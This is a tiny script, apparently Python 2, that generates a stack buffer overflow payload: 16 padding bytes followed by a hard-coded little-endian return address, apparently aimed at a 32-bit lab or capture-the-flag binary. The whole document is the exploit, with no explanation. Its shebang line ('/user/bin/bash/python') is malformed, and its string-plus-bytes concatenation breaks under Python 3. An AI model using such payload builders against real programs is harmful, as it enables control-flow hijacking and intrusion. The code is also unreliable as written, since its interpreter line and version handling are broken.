#!/user/bin/bash/python

from struct import pack
addr = pack("<I", 0x80488df) # <I is little endian
print('A'*16 + addr)
